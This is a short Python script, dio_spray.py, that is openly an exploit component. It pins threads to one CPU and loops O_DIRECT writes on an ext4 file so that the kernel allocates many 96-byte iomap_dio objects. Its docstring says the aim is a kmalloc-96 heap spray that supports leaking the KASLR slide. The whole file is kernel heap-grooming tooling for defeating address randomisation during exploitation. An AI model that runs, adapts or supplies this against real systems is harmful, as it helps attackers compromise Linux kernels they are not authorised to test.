#!/usr/bin/env python3
"""dio_spray.py <cpu> <path> [threads]

Churn O_DIRECT writes on an ext4 file, pinned to <cpu>.  Each write goes
through __iomap_dio_rw() and allocates a 96-byte struct iomap_dio, whose
dops (offset 8) is &ext4_dio_write_ops (a .data pointer).  Used as a
kmalloc-96 neighbour spray for the wire-only KASLR slide leak.
"""
import mmap
import os
import sys
import threading
import time

cpu = int(sys.argv[1])
path = sys.argv[2]
nthreads = int(sys.argv[3]) if len(sys.argv) > 3 else 8
BS = 4096
os.sched_setaffinity(0, {cpu})
d = os.path.dirname(path)
if d:
    os.makedirs(d, exist_ok=True)
fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_DIRECT, 0o600)
try:
    os.posix_fallocate(fd, 0, BS * 256)
except OSError:
    os.ftruncate(fd, BS * 256)
os.close(fd)


def worker(k):
    os.sched_setaffinity(0, {cpu})
    f = os.open(path, os.O_WRONLY | os.O_DIRECT)
    b = mmap.mmap(-1, BS)
    off = BS * k
    while True:
        try:
            os.pwrite(f, b, off)
        except OSError:
            pass


for k in range(nthreads):
    threading.Thread(target=worker, args=(k,), daemon=True).start()
print("dio_spray cpu=%d threads=%d path=%s" % (cpu, nthreads, path), flush=True)
while True:
    time.sleep(3600)
